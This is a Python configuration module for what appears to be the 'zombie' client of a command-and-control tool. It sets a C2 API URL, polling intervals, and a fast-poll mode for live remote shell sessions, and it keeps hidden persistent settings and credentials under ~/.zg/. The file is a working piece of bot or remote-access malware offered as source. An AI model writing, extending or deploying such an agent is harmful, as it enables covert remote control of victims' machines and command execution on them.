#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import os
from time import sleep

from app.modules.backup_settings import get_zombie_settings, set_zombie_settings

class Config:
    def __init__(self):
        # enable/disable options
        self.DEBUG = False
        self.USER_PERSISTENCE = True
        # default paths
        self.APP_DIR = os.path.expanduser(os.getcwd())
        self.BASE_DIR = os.path.expanduser('~/.zg/')
        self.TEMP_DIR = os.path.join(self.APP_DIR, os.path.expanduser('../.ztmp/'))
        self.PATH_SETTINGS = os.path.join(self.BASE_DIR, 'zg.conf')
        self.PATH_CREDENTIALS = os.path.join(self.BASE_DIR, 'zg.cred')
        self.PATH_SCHEDULER = os.path.join(self.BASE_DIR, 'zg.sch')
        # url to cc api
        self.credentials = {'cc_url': 'http://192.168.1.131:8080/api'}
        # default settings
        self.settings = {
            'refresh_tasks': 10.5,     # secs between each task refresh
            'default_refresh': 10.5,   # value to use when some setting is missing or wrong
            'inet_unreach_retry': 15,  # secs between each retry after conn error
            'token_check_retry': 1,    # secs between each token expiration local recheck
            'live_rsh_retry': 0.3,     # secs between each recheck for new commands during live remote shell session
        }

    def toggle_live_remote_shell(self):
        self.settings["refresh_tasks"], self.settings["live_rsh_retry"] = self.settings["live_rsh_retry"], self.settings["refresh_tasks"]

    def enable_rshell_session(self):
        actual = self.settings['refresh_tasks']
        if self.settings['refresh_tasks'] > self.settings['live_rsh_retry']:
            self.toggle_live_remote_shell()
        return actual

    def disable_rshell_session(self):
        if self.settings['refresh_tasks'] < self.settings['live_rsh_retry']:
            self.toggle_live_remote_shell()

    def read_setting(self, field):
        while True:
            try:
                value = self.settings[field]
                return value
            except KeyError:
                self.set_setting(field, 10.5)
                return False

    def set_setting(self, field, value):
        try:
            self.settings[field] = value
            return True
        except KeyError:
            return False
        finally:
            self.write_settings()

    # read saved conf from winreg/file
    def load_settings(self):
        settings = get_zombie_settings(self.PATH_SETTINGS, 'settings')
        if settings:
            self.settings = settings
            return True
        return False

    def load_credentials(self):
        credentials = get_zombie_settings(self.PATH_CREDENTIALS, 'credentials')
        if credentials:
            self.credentials = credentials
            return True
        return False

    # write running conf to winreg/file
    def write_settings(self):
        if set_zombie_settings(self.PATH_SETTINGS, 'settings', self.settings):
            return True
        return False

    def write_credentials(self):
        if set_zombie_settings(self.PATH_CREDENTIALS, 'credentials', self.credentials):
            return True
        return False

    def autosetup(self):
        from app.components import token, logger

        if (not self.load_credentials()) or (not self.USER_PERSISTENCE):
            while not token.create_user():
                sleep(self.read_setting('inet_unreach_retry'))
            logger.log('default settings loaded', 'WARNING')
            if self.USER_PERSISTENCE:
                self.write_credentials()

        if not self.load_settings() and self.USER_PERSISTENCE:
            # default settings were loaded
            self.write_settings()
            logger.log('new settings saved', 'WARNING')
        logger.log('settings and credentials loaded', 'SUCCESS')
        return True
